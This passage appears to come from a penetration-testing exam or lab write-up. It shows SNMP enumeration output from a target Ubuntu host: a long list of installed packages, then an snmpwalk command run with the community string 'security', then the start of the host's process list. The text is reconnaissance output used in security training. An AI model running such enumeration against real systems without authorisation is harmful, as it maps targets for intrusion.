iso.3.6.1.2.1.25.6.3.1.2.420 = STRING: "nano_6.2-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.421 = STRING: "ncurses-base_6.3-2_all"
iso.3.6.1.2.1.25.6.3.1.2.422 = STRING: "ncurses-bin_6.3-2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.423 = STRING: "ncurses-term_6.3-2_all"
iso.3.6.1.2.1.25.6.3.1.2.424 = STRING: "needrestart_3.5-5ubuntu2.1_all"
iso.3.6.1.2.1.25.6.3.1.2.425 = STRING: "net-tools_1.60+git20181103.0eebece-1ubuntu5_amd64"
iso.3.6.1.2.1.25.6.3.1.2.426 = STRING: "netbase_6.3_all"
iso.3.6.1.2.1.25.6.3.1.2.427 = STRING: "netcat-openbsd_1.218-4ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.428 = STRING: "netfilter-persistent_1.0.16_all"
iso.3.6.1.2.1.25.6.3.1.2.429 = STRING: "netplan.io_0.105-0ubuntu2~22.04.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.430 = STRING: "networkd-dispatcher_2.1-2ubuntu0.22.04.2_all"
iso.3.6.1.2.1.25.6.3.1.2.431 = STRING: "nftables_1.0.2-1ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.432 = STRING: "ntfs-3g_1:2021.8.22-3ubuntu1.2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.433 = STRING: "open-iscsi_2.1.5-1ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.434 = STRING: "open-vm-tools_2:12.1.0-1~ubuntu0.22.04.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.435 = STRING: "openssh-client_1:8.9p1-3ubuntu0.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.436 = STRING: "openssh-server_1:8.9p1-3ubuntu0.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.437 = STRING: "openssh-sftp-server_1:8.9p1-3ubuntu0.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.438 = STRING: "openssl_3.0.2-0ubuntu1.8_amd64"
iso.3.6.1.2.1.25.6.3.1.2.439 = STRING: "os-prober_1.79ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.440 = STRING: "overlayroot_0.47ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.441 = STRING: "packagekit_1.2.5-2ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.442 = STRING: "packagekit-tools_1.2.5-2ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.443 = STRING: "parted_3.4-2build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.444 = STRING: "passwd_1:4.8.1-2ubuntu2.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.445 = STRING: "pastebinit_1.5.1-1ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.446 = STRING: "patch_2.7.6-7build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.447 = STRING: "pci.ids_0.0~2022.01.22-1_all"
iso.3.6.1.2.1.25.6.3.1.2.448 = STRING: "pciutils_1:3.7.0-6_amd64"
iso.3.6.1.2.1.25.6.3.1.2.449 = STRING: "perl_5.34.0-3ubuntu1.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.450 = STRING: "perl-base_5.34.0-3ubuntu1.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.451 = STRING: "perl-modules-5.34_5.34.0-3ubuntu1.1_all"
iso.3.6.1.2.1.25.6.3.1.2.452 = STRING: "pinentry-curses_1.1.1-1build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.453 = STRING: "pkexec_0.105-33_amd64"
iso.3.6.1.2.1.25.6.3.1.2.454 = STRING: "plymouth_0.9.5+git20211018-1ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.455 = STRING: "plymouth-theme-ubuntu-text_0.9.5+git20211018-1ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.456 = STRING: "policykit-1_0.105-33_amd64"
iso.3.6.1.2.1.25.6.3.1.2.457 = STRING: "polkitd_0.105-33_amd64"
iso.3.6.1.2.1.25.6.3.1.2.458 = STRING: "pollinate_4.33-3ubuntu2_all"
iso.3.6.1.2.1.25.6.3.1.2.459 = STRING: "powermgmt-base_1.36_all"
iso.3.6.1.2.1.25.6.3.1.2.460 = STRING: "procps_2:3.3.17-6ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.461 = STRING: "psmisc_23.4-2build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.462 = STRING: "publicsuffix_20211207.1025-1_all"
iso.3.6.1.2.1.25.6.3.1.2.463 = STRING: "python-apt-common_2.4.0_all"
iso.3.6.1.2.1.25.6.3.1.2.464 = STRING: "python-babel-localedata_2.8.0+dfsg.1-7_all"
iso.3.6.1.2.1.25.6.3.1.2.465 = STRING: "python3_3.10.6-1~22.04_amd64"
iso.3.6.1.2.1.25.6.3.1.2.466 = STRING: "python3-apport_2.20.11-0ubuntu82.3_all"
iso.3.6.1.2.1.25.6.3.1.2.467 = STRING: "python3-apt_2.4.0_amd64"
iso.3.6.1.2.1.25.6.3.1.2.468 = STRING: "python3-attr_21.2.0-1_all"
iso.3.6.1.2.1.25.6.3.1.2.469 = STRING: "python3-automat_20.2.0-1_all"
iso.3.6.1.2.1.25.6.3.1.2.470 = STRING: "python3-babel_2.8.0+dfsg.1-7_all"
iso.3.6.1.2.1.25.6.3.1.2.471 = STRING: "python3-bcrypt_3.2.0-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.472 = STRING: "python3-blinker_1.4+dfsg1-0.4_all"
iso.3.6.1.2.1.25.6.3.1.2.473 = STRING: "python3-certifi_2020.6.20-1_all"
iso.3.6.1.2.1.25.6.3.1.2.474 = STRING: "python3-cffi-backend_1.15.0-1build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.475 = STRING: "python3-chardet_4.0.0-1_all"
iso.3.6.1.2.1.25.6.3.1.2.476 = STRING: "python3-click_8.0.3-1_all"
iso.3.6.1.2.1.25.6.3.1.2.477 = STRING: "python3-colorama_0.4.4-1_all"
iso.3.6.1.2.1.25.6.3.1.2.478 = STRING: "python3-commandnotfound_22.04.0_all"
iso.3.6.1.2.1.25.6.3.1.2.479 = STRING: "python3-configobj_5.0.6-5_all"
iso.3.6.1.2.1.25.6.3.1.2.480 = STRING: "python3-constantly_15.1.0-2_all"
iso.3.6.1.2.1.25.6.3.1.2.481 = STRING: "python3-cryptography_3.4.8-1ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.482 = STRING: "python3-dbus_1.2.18-3build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.483 = STRING: "python3-debconf_1.5.79ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.484 = STRING: "python3-debian_0.1.43ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.485 = STRING: "python3-distro_1.7.0-1_all"
iso.3.6.1.2.1.25.6.3.1.2.486 = STRING: "python3-distro-info_1.1build1_all"
iso.3.6.1.2.1.25.6.3.1.2.487 = STRING: "python3-distupgrade_1:22.04.15_all"
iso.3.6.1.2.1.25.6.3.1.2.488 = STRING: "python3-distutils_3.10.6-1~22.04_all"
iso.3.6.1.2.1.25.6.3.1.2.489 = STRING: "python3-gdbm_3.10.6-1~22.04_amd64"
iso.3.6.1.2.1.25.6.3.1.2.490 = STRING: "python3-gi_3.42.1-0ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.491 = STRING: "python3-hamcrest_2.0.2-2_all"
iso.3.6.1.2.1.25.6.3.1.2.492 = STRING: "python3-httplib2_0.20.2-2_all"
iso.3.6.1.2.1.25.6.3.1.2.493 = STRING: "python3-hyperlink_21.0.0-3_all"
iso.3.6.1.2.1.25.6.3.1.2.494 = STRING: "python3-idna_3.3-1_all"
iso.3.6.1.2.1.25.6.3.1.2.495 = STRING: "python3-importlib-metadata_4.6.4-1_all"
iso.3.6.1.2.1.25.6.3.1.2.496 = STRING: "python3-incremental_21.3.0-1_all"
iso.3.6.1.2.1.25.6.3.1.2.497 = STRING: "python3-jeepney_0.7.1-3_all"
iso.3.6.1.2.1.25.6.3.1.2.498 = STRING: "python3-jinja2_3.0.3-1_all"
iso.3.6.1.2.1.25.6.3.1.2.499 = STRING: "python3-json-pointer_2.0-0ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.500 = STRING: "python3-jsonpatch_1.32-2_all"
iso.3.6.1.2.1.25.6.3.1.2.501 = STRING: "python3-jsonschema_3.2.0-0ubuntu2_all"
iso.3.6.1.2.1.25.6.3.1.2.502 = STRING: "python3-jwt_2.3.0-1ubuntu0.2_all"
iso.3.6.1.2.1.25.6.3.1.2.503 = STRING: "python3-keyring_23.5.0-1_all"
iso.3.6.1.2.1.25.6.3.1.2.504 = STRING: "python3-launchpadlib_1.10.16-1_all"
iso.3.6.1.2.1.25.6.3.1.2.505 = STRING: "python3-lazr.restfulclient_0.14.4-1_all"
iso.3.6.1.2.1.25.6.3.1.2.506 = STRING: "python3-lazr.uri_1.0.6-2_all"
iso.3.6.1.2.1.25.6.3.1.2.507 = STRING: "python3-lib2to3_3.10.6-1~22.04_all"
iso.3.6.1.2.1.25.6.3.1.2.508 = STRING: "python3-magic_2:0.4.24-2_all"
iso.3.6.1.2.1.25.6.3.1.2.509 = STRING: "python3-markupsafe_2.0.1-2build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.510 = STRING: "python3-minimal_3.10.6-1~22.04_amd64"
iso.3.6.1.2.1.25.6.3.1.2.511 = STRING: "python3-more-itertools_8.10.0-2_all"
iso.3.6.1.2.1.25.6.3.1.2.512 = STRING: "python3-netifaces_0.11.0-1build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.513 = STRING: "python3-newt_0.52.21-5ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.514 = STRING: "python3-oauthlib_3.2.0-1ubuntu0.1_all"
iso.3.6.1.2.1.25.6.3.1.2.515 = STRING: "python3-openssl_21.0.0-1_all"
iso.3.6.1.2.1.25.6.3.1.2.516 = STRING: "python3-pexpect_4.8.0-2ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.517 = STRING: "python3-pkg-resources_59.6.0-1.2ubuntu0.22.04.1_all"
iso.3.6.1.2.1.25.6.3.1.2.518 = STRING: "python3-problem-report_2.20.11-0ubuntu82.3_all"
iso.3.6.1.2.1.25.6.3.1.2.519 = STRING: "python3-ptyprocess_0.7.0-3_all"
iso.3.6.1.2.1.25.6.3.1.2.520 = STRING: "python3-pyasn1_0.4.8-1_all"
iso.3.6.1.2.1.25.6.3.1.2.521 = STRING: "python3-pyasn1-modules_0.2.1-1_all"
iso.3.6.1.2.1.25.6.3.1.2.522 = STRING: "python3-pyparsing_2.4.7-1_all"
iso.3.6.1.2.1.25.6.3.1.2.523 = STRING: "python3-pyrsistent_0.18.1-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.524 = STRING: "python3-requests_2.25.1+dfsg-2_all"
iso.3.6.1.2.1.25.6.3.1.2.525 = STRING: "python3-secretstorage_3.3.1-1_all"
iso.3.6.1.2.1.25.6.3.1.2.526 = STRING: "python3-serial_3.5-1_all"
iso.3.6.1.2.1.25.6.3.1.2.527 = STRING: "python3-service-identity_18.1.0-6_all"
iso.3.6.1.2.1.25.6.3.1.2.528 = STRING: "python3-setuptools_59.6.0-1.2ubuntu0.22.04.1_all"
iso.3.6.1.2.1.25.6.3.1.2.529 = STRING: "python3-six_1.16.0-3ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.530 = STRING: "python3-software-properties_0.99.22_all"
iso.3.6.1.2.1.25.6.3.1.2.531 = STRING: "python3-systemd_234-3ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.532 = STRING: "python3-twisted_22.1.0-2ubuntu2.3_all"
iso.3.6.1.2.1.25.6.3.1.2.533 = STRING: "python3-tz_2022.1-1ubuntu0.22.04.0_all"
iso.3.6.1.2.1.25.6.3.1.2.534 = STRING: "python3-update-manager_1:22.04.10_all"
iso.3.6.1.2.1.25.6.3.1.2.535 = STRING: "python3-urllib3_1.26.5-1~exp1_all"
iso.3.6.1.2.1.25.6.3.1.2.536 = STRING: "python3-wadllib_1.3.6-1_all"
iso.3.6.1.2.1.25.6.3.1.2.537 = STRING: "python3-xkit_0.5.0ubuntu5_all"
iso.3.6.1.2.1.25.6.3.1.2.538 = STRING: "python3-yaml_5.4.1-1ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.539 = STRING: "python3-zipp_1.0.0-3_all"
iso.3.6.1.2.1.25.6.3.1.2.540 = STRING: "python3-zope.interface_5.4.0-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.541 = STRING: "python3.10_3.10.6-1~22.04.2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.542 = STRING: "python3.10-minimal_3.10.6-1~22.04.2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.543 = STRING: "readline-common_8.1.2-1_all"
iso.3.6.1.2.1.25.6.3.1.2.544 = STRING: "rsync_3.2.3-8ubuntu3.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.545 = STRING: "rsyslog_8.2112.0-2ubuntu2.2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.546 = STRING: "run-one_1.17-0ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.547 = STRING: "sbsigntool_0.9.4-2ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.548 = STRING: "screen_4.9.0-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.549 = STRING: "secureboot-db_1.8_amd64"
iso.3.6.1.2.1.25.6.3.1.2.550 = STRING: "sed_4.8-1ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.551 = STRING: "sensible-utils_0.0.17_all"
iso.3.6.1.2.1.25.6.3.1.2.552 = STRING: "sg3-utils_1.46-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.553 = STRING: "sg3-utils-udev_1.46-1build1_all"
iso.3.6.1.2.1.25.6.3.1.2.554 = STRING: "shared-mime-info_2.1-2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.555 = STRING: "snapd_2.58+22.04_amd64"
iso.3.6.1.2.1.25.6.3.1.2.556 = STRING: "snmpd_5.9.1+dfsg-1ubuntu2.4_amd64"
iso.3.6.1.2.1.25.6.3.1.2.557 = STRING: "software-properties-common_0.99.22_all"
iso.3.6.1.2.1.25.6.3.1.2.558 = STRING: "sosreport_4.4-1ubuntu1.22.04.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.559 = STRING: "squashfs-tools_1:4.5-3build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.560 = STRING: "ssh-import-id_5.11-0ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.561 = STRING: "ssl-cert_1.1.2_all"
iso.3.6.1.2.1.25.6.3.1.2.562 = STRING: "strace_5.16-0ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.563 = STRING: "sudo_1.9.9-1ubuntu2.2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.564 = STRING: "systemd_249.11-0ubuntu3.6_amd64"
iso.3.6.1.2.1.25.6.3.1.2.565 = STRING: "systemd-hwe-hwdb_249.11.2_all"
iso.3.6.1.2.1.25.6.3.1.2.566 = STRING: "systemd-sysv_249.11-0ubuntu3.6_amd64"
iso.3.6.1.2.1.25.6.3.1.2.567 = STRING: "systemd-timesyncd_249.11-0ubuntu3.6_amd64"
iso.3.6.1.2.1.25.6.3.1.2.568 = STRING: "sysvinit-utils_3.01-1ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.569 = STRING: "tar_1.34+dfsg-1build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.570 = STRING: "tcl_8.6.11+1build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.571 = STRING: "tcl8.6_8.6.12+dfsg-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.572 = STRING: "tcpdump_4.99.1-3build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.573 = STRING: "telnet_0.17-44build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.574 = STRING: "thermald_2.4.9-1ubuntu0.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.575 = STRING: "thin-provisioning-tools_0.9.0-2ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.576 = STRING: "time_1.9-0.1build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.577 = STRING: "tmux_3.2a-4ubuntu0.2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.578 = STRING: "tnftp_20210827-4build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.579 = STRING: "tpm-udev_0.6_all"
iso.3.6.1.2.1.25.6.3.1.2.580 = STRING: "tzdata_2022g-0ubuntu0.22.04.1_all"
iso.3.6.1.2.1.25.6.3.1.2.581 = STRING: "ubuntu-advantage-tools_27.7~22.04.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.582 = STRING: "ubuntu-drivers-common_1:0.9.6.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.583 = STRING: "ubuntu-keyring_2021.03.26_all"
iso.3.6.1.2.1.25.6.3.1.2.584 = STRING: "ubuntu-minimal_1.481_amd64"
iso.3.6.1.2.1.25.6.3.1.2.585 = STRING: "ubuntu-release-upgrader-core_1:22.04.15_all"
iso.3.6.1.2.1.25.6.3.1.2.586 = STRING: "ubuntu-server_1.481_amd64"
iso.3.6.1.2.1.25.6.3.1.2.587 = STRING: "ubuntu-server-minimal_1.481_amd64"
iso.3.6.1.2.1.25.6.3.1.2.588 = STRING: "ubuntu-standard_1.481_amd64"
iso.3.6.1.2.1.25.6.3.1.2.589 = STRING: "ucf_3.0043_all"
iso.3.6.1.2.1.25.6.3.1.2.590 = STRING: "udev_249.11-0ubuntu3.6_amd64"
iso.3.6.1.2.1.25.6.3.1.2.591 = STRING: "udisks2_2.9.4-1ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.592 = STRING: "ufw_0.36.1-4build1_all"
iso.3.6.1.2.1.25.6.3.1.2.593 = STRING: "unattended-upgrades_2.8ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.594 = STRING: "unzip_6.0-26ubuntu3.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.595 = STRING: "update-manager-core_1:22.04.10_all"
iso.3.6.1.2.1.25.6.3.1.2.596 = STRING: "update-notifier-common_3.192.54_all"
iso.3.6.1.2.1.25.6.3.1.2.597 = STRING: "upower_0.99.17-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.598 = STRING: "usb-modeswitch_2.6.1-3ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.599 = STRING: "usb-modeswitch-data_20191128-4_all"
iso.3.6.1.2.1.25.6.3.1.2.600 = STRING: "usb.ids_2022.04.02-1_all"
iso.3.6.1.2.1.25.6.3.1.2.601 = STRING: "usbmuxd_1.1.1-2build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.602 = STRING: "usbutils_1:014-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.603 = STRING: "usrmerge_25ubuntu2_all"
iso.3.6.1.2.1.25.6.3.1.2.604 = STRING: "util-linux_2.37.2-4ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.605 = STRING: "uuid-runtime_2.37.2-4ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.606 = STRING: "vim_2:8.2.3995-1ubuntu2.3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.607 = STRING: "vim-common_2:8.2.3995-1ubuntu2.3_all"
iso.3.6.1.2.1.25.6.3.1.2.608 = STRING: "vim-runtime_2:8.2.3995-1ubuntu2.3_all"
iso.3.6.1.2.1.25.6.3.1.2.609 = STRING: "vim-tiny_2:8.2.3995-1ubuntu2.3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.610 = STRING: "vsftpd_3.0.5-0ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.611 = STRING: "wget_1.21.2-2ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.612 = STRING: "whiptail_0.52.21-5ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.613 = STRING: "wireless-regdb_2022.06.06-0ubuntu1~22.04.1_all"
iso.3.6.1.2.1.25.6.3.1.2.614 = STRING: "xauth_1:1.1-1build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.615 = STRING: "xdg-user-dirs_0.17-2ubuntu4_amd64"
iso.3.6.1.2.1.25.6.3.1.2.616 = STRING: "xfsprogs_5.13.0-1ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.617 = STRING: "xkb-data_2.33-1_all"
iso.3.6.1.2.1.25.6.3.1.2.618 = STRING: "xxd_2:8.2.3995-1ubuntu2.3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.619 = STRING: "xz-utils_5.2.5-2ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.620 = STRING: "zerofree_1.1.1-1build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.621 = STRING: "zlib1g_1:1.2.11.dfsg-2ubuntu9.2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.622 = STRING: "zstd_1.4.8+dfsg-3build1_amd64"
```


```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-1]
└─# snmpwalk -v2c -c security 192.168.55.110 1.3.6.1.2.1.25.4.2.1.2
iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: "systemd"
iso.3.6.1.2.1.25.4.2.1.2.2 = STRING: "kthreadd"
iso.3.6.1.2.1.25.4.2.1.2.3 = STRING: "rcu_gp"
iso.3.6.1.2.1.25.4.2.1.2.4 = STRING: "rcu_par_gp"
iso.3.6.1.2.1.25.4.2.1.2.5 = STRING: "slub_flushwq"
iso.3.6.1.2.1.25.4.2.1.2.6 = STRING: "netns"
iso.3.6.1.2.1.25.4.2.1.2.8 = STRING: "kworker/0:0H-events_highpri"
iso.3.6.1.2.1.25.4.2.1.2.10 = STRING: "mm_percpu_wq"
iso.3.6.1.2.1.25.4.2.1.2.11 = STRING: "rcu_tasks_rude_"
iso.3.6.1.2.1.25.4.2.1.2.12 = STRING: "rcu_tasks_trace"
iso.3.6.1.2.1.25.4.2.1.2.13 = STRING: "ksoftirqd/0"
iso.3.6.1.2.1.25.4.2.1.2.14 = STRING: "rcu_sched"
iso.3.6.1.2.1.25.4.2.1.2.15 = STRING: "migration/0"
iso.3.6.1.2.1.25.4.2.1.2.16 = STRING: "idle_inject/0"
iso.3.6.1.2.1.25.4.2.1.2.18 = STRING: "cpuhp/0"
iso.3.6.1.2.1.25.4.2.1.2.19 = STRING: "cpuhp/1"
iso.3.6.1.2.1.25.4.2.1.2.20 = STRING: "idle_inject/1"
iso.3.6.1.2.1.25.4.2.1.2.21 = STRING: "migration/1"
iso.3.6.1.2.1.25.4.2.1.2.22 = STRING: "ksoftirqd/1"
iso.3.6.1.2.1.25.4.2.1.2.24 = STRING: "kworker/1:0H-events_highpri"
iso.3.6.1.2.1.25.4.2.1.2.25 = STRING: "kdevtmpfs"
iso.3.6.1.2.1.25.4.2.1.2.26 = STRING: "inet_frag_wq"
iso.3.6.1.2.1.25.4.2.1.2.27 = STRING: "kauditd"
iso.3.6.1.2.1.25.4.2.1.2.28 = STRING: "khungtaskd"
iso.3.6.1.2.1.25.4.2.1.2.29 = STRING: "oom_reaper"
iso.3.6.1.2.1.25.4.2.1.2.30 = STRING: "writeback"
iso.3.6.1.2.1.25.4.2.1.2.31 = STRING: "kcompactd0"
iso.3.6.1.2.1.25.4.2.1.2.32 = STRING: "ksmd"
iso.3.6.1.2.1.25.4.2.1.2.33 = STRING: "khugepaged"
iso.3.6.1.2.1.25.4.2.1.2.80 = STRING: "kintegrityd"
iso.3.6.1.2.1.25.4.2.1.2.81 = STRING: "kblockd"
iso.3.6.1.2.1.25.4.2.1.2.82 = STRING: "blkcg_punt_bio"
iso.3.6.1.2.1.25.4.2.1.2.83 = STRING: "tpm_dev_wq"
iso.3.6.1.2.1.25.4.2.1.2.84 = STRING: "ata_sff"
iso.3.6.1.2.1.25.4.2.1.2.85 = STRING: "md"
iso.3.6.1.2.1.25.4.2.1.2.86 = STRING: "edac-poller"
iso.3.6.1.2.1.25.4.2.1.2.87 = STRING: "devfreq_wq"
iso.3.6.1.2.1.25.4.2.1.2.88 = STRING: "watchdogd"
iso.3.6.1.2.1.25.4.2.1.2.90 = STRING: "kworker/0:1H-kblockd"
iso.3.6.1.2.1.25.4.2.1.2.92 = STRING: "kswapd0"
iso.3.6.1.2.1.25.4.2.1.2.93 = STRING: "ecryptfs-kthrea"
iso.3.6.1.2.1.25.4.2.1.2.95 = STRING: "kthrotld"
iso.3.6.1.2.1.25.4.2.1.2.96 = STRING: "irq/24-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.97 = STRING: "irq/25-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.98 = STRING: "irq/26-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.99 = STRING: "irq/27-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.100 = STRING: "irq/28-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.101 = STRING: "irq/29-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.102 = STRING: "irq/30-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.103 = STRING: "irq/31-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.104 = STRING: "irq/32-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.105 = STRING: "irq/33-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.106 = STRING: "irq/34-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.107 = STRING: "irq/35-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.108 = STRING: "irq/36-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.109 = STRING: "irq/37-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.110 = STRING: "irq/38-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.111 = STRING: "irq/39-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.112 = STRING: "irq/40-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.113 = STRING: "irq/41-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.114 = STRING: "irq/42-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.115 = STRING: "irq/43-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.116 = STRING: "irq/44-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.117 = STRING: "irq/45-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.118 = STRING: "irq/46-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.119 = STRING: "irq/47-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.120 = STRING: "irq/48-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.121 = STRING: "irq/49-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.122 = STRING: "irq/50-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.123 = STRING: "irq/51-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.124 = STRING: "irq/52-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.125 = STRING: "irq/53-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.126 = STRING: "irq/54-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.127 = STRING: "irq/55-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.128 = STRING: "acpi_thermal_pm"
iso.3.6.1.2.1.25.4.2.1.2.130 = STRING: "scsi_eh_0"
iso.3.6.1.2.1.25.4.2.1.2.131 = STRING: "scsi_tmf_0"
iso.3.6.1.2.1.25.4.2.1.2.132 = STRING: "scsi_eh_1"
iso.3.6.1.2.1.25.4.2.1.2.133 = STRING: "scsi_tmf_1"
iso.3.6.1.2.1.25.4.2.1.2.135 = STRING: "vfio-irqfd-clea"
iso.3.6.1.2.1.25.4.2.1.2.136 = STRING: "kstrp"
iso.3.6.1.2.1.25.4.2.1.2.139 = STRING: "zswap-shrink"
iso.3.6.1.2.1.25.4.2.1.2.140 = STRING: "kworker/u5:0"
iso.3.6.1.2.1.25.4.2.1.2.146 = STRING: "charger_manager"
iso.3.6.1.2.1.25.4.2.1.2.168 = STRING: "kworker/1:1H-kblockd"
iso.3.6.1.2.1.25.4.2.1.2.188 = STRING: "mpt_poll_0"
iso.3.6.1.2.1.25.4.2.1.2.189 = STRING: "mpt/0"
iso.3.6.1.2.1.25.4.2.1.2.190 = STRING: "scsi_eh_2"
iso.3.6.1.2.1.25.4.2.1.2.191 = STRING: "scsi_tmf_2"
iso.3.6.1.2.1.25.4.2.1.2.192 = STRING: "ttm_swap"
iso.3.6.1.2.1.25.4.2.1.2.193 = STRING: "scsi_eh_3"
iso.3.6.1.2.1.25.4.2.1.2.194 = STRING: "scsi_tmf_3"
iso.3.6.1.2.1.25.4.2.1.2.195 = STRING: "scsi_eh_4"
iso.3.6.1.2.1.25.4.2.1.2.196 = STRING: "scsi_tmf_4"
iso.3.6.1.2.1.25.4.2.1.2.197 = STRING: "scsi_eh_5"
iso.3.6.1.2.1.25.4.2.1.2.198 = STRING: "scsi_tmf_5"
iso.3.6.1.2.1.25.4.2.1.2.199 = STRING: "scsi_eh_6"
iso.3.6.1.2.1.25.4.2.1.2.200 = STRING: "scsi_tmf_6"
iso.3.6.1.2.1.25.4.2.1.2.201 = STRING: "scsi_eh_7"
iso.3.6.1.2.1.25.4.2.1.2.202 = STRING: "scsi_tmf_7"
